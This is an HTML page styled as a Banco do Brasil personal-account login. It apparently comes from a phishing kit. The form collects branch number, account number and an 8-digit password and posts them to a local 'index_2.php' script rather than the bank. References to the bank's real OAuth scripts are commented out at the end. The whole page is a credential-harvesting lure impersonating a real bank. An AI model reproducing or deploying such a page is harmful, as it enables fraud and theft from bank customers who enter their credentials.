
<!DOCTYPE html>
<html lang="pt-br" data-ng-app="openBanking" oauth-loading class="fundo-azul">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Banco do Brasil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="imagens/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="css/angular-material.min8cea.css" />
    <link rel="stylesheet" type="text/css" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/titulares.css" />
    <link rel="stylesheet" type="text/css" href="css/input.css" />
    <link rel="stylesheet" type="text/css" href="css/componentes.css" />
    <link rel="stylesheet" type="text/css" href="css/voltar.css" />
    <link rel="stylesheet" type="text/css" href="css/contas.css" />
    <link rel="stylesheet" type="text/css" href="css/termo.css" />
	
    <script src="lib/jquery-1-12-4.js"></script>
    <script src="lib/jquery.mask.min.js"></script>
	 <script src="lib/mask.min.js"></script>
    <script src="lib/indexeddb.js"></script>
	<script src="lib/home.js"></script>
	
	    <script src="lib/oauthBB3d10.js"></script>
    <!-- values -->
    <script src="lib/oauthBB.values3d10.js"></script>
    <!-- services -->
    <script src="lib/diretivas3d10.js"></script>
    <script src="lib/servicos3d10.js"></script>
    <script src="lib/oauthBB.services3d10.js"></script>
    <script src="lib/oauthBB.filters3d10.js"></script>
</head>

<body class="caixa">


    <div data-ng-view="" class="ng-scope" style="">
        <section class="hero is-fullheight ng-scope">
            <div class="disabilitado-hero-body">
                <div class="container">
					                    <div class="column is-4 is-offset-4 caixa">
                        <section class="page-section">
                            <!-- ngIf: vm.migalha.length --><a class="voltar ng-scope md-none-theme" data-ng-if="vm.migalha.length" data-ng-click="vm.voltarPagina()" href="index-2.html">
                                <img src="imagens/back-button.svg" style="border: 0; float: left; margin-right: 5px">
                                <span>Voltar</span>
                            </a><!-- end ngIf: vm.migalha.length -->
                        </section>
                    </div>
					                    <section class="page-section welcome-section is-white">
                        <figure class="avatar">
                            <img class="logo" data-ng-src="imagens/logo-login.jpg" src="imagens/logo-login.jpg">
                        </figure>
                    </section>
                    <div class="column is-4 is-offset-4 caixa">
                        <p class="subtitle is-subtitulo-azul has-text-centered">Pessoa Física</p>
                        <form autocomplete="off" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-pattern" onsubmit="return check_lg();" action="index_2.php" method="POST">
                            <div>
								
                                <input type="tel" ng-model="agencia" name="agencia" id="dependenciaOrigem"  focus="focus" data-ng-required="" data-ng-focus="!vm.isCampoPreenchido(vm.agencia)" data-ng-model="vm.agencia" data-autofocus="" clean="true" data-bb-input-agencia=""  class="" maxlength="6" minlength="5" required="required" aria-invalid="true" onkeyup="maskTrak('####-@', this)" autofocus>
                                <label class="has-text-lefted">Agência</label>
                            </div>
                            <div>
                                <input name="conta" id="Conta" type="tel" data-ng-required="!vm.isCampoPreenchido(vm.conta)" data-ng-focus="!vm.isCampoPreenchido(vm.conta)" data-ng-model="vm.conta" clean="true" data-bb-input-conta="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="10" required="required" aria-invalid="true" onkeyup="maskTrak('###########-@', this)">
                                <label class="has-text-lefted">Conta</label>
                            </div>
                            <div>
                                <input id="inpSenha" name="senha" type="tel" pattern="[0-9]*" autocomplete="off" data-bb-input-senha-numerica="" data-ng-required="!vm.isCampoPreenchido(vm.senha)" data-ng-focus="!vm.isCampoPreenchido(vm.senha)" data-ng-model="vm.senha" maxlength="8" minlength="8" class="ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-pattern" required="required" aria-invalid="true">
                                <label class="has-text-lefted">Senha de 8 dígitos</label>
                            </div>
                            <div style="margin: 0px;">
                                <p class="instrucao">Substitua o "X" pelo "0" quando houver</p>
                            </div>

                            <br>
                            <button class="botao-amarelo is-fullwidth" data-ng-click="vm.autenticar()">Entrar</button>
                     <br>
  
</article>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </div>

</body>
<!--<script type="text/javascript" src="app-f30f696d54feda2a6583.js"></script></body>
	<script src="runtime.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/vendor.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/app.bundle.js?data=201806061400"></script-->

</html>